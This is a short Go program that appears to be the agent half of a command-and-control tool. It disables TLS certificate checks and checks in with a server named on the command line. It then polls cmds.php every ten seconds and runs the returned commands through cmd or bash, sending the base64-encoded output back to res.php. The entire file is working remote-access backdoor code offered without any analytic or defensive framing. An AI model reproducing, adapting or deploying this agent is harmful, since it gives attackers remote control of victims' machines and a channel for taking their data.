package main

import (
   "net/http"
   "crypto/tls"
   b64 "encoding/base64"
   "fmt"
   "os"
   "time"
   "io/ioutil"
   "strings"
   "os/exec"
)



func main() {
id := os.Args[1]
data := "Hello From Agent "+ id +" Go"
sEnc := b64.StdEncoding.EncodeToString([]byte(data))


http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
_, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
if err != nil {
	fmt.Println(err)
}


for{

hey()

}


}


func hey(){

id := os.Args[1]
http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
res, err := http.Get(os.Args[2]+"/cmds.php?id="+id+"&o=G")
if err != nil {
	fmt.Println(err)
	}
resBody, err := ioutil.ReadAll(res.Body)


cmds := string(resBody)

for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
      if strings.Contains(string(line), string(id)){
      fmt.Println(line)
      var syscmd string
      var sysparam string
      syscmd = "cmd"
      sysparam = "/c"
      cmdline := strings.Join(strings.Split(line, ":")[1:], ":")
      if string(os.PathSeparator) == "/" {
      syscmd = "/bin/bash"
      sysparam = "-c"
      }
      Output, err := exec.Command(syscmd, sysparam, cmdline).Output()
      if err != nil {
        fmt.Println(err)
      }
     
      b64Output := b64.StdEncoding.EncodeToString([]byte(string(Output)))
      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
      gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
      if err != nil {
	fmt.Println(err)
	}
      fmt.Println(gimme)	
      }
      }

time.Sleep(10 * time.Second)


}
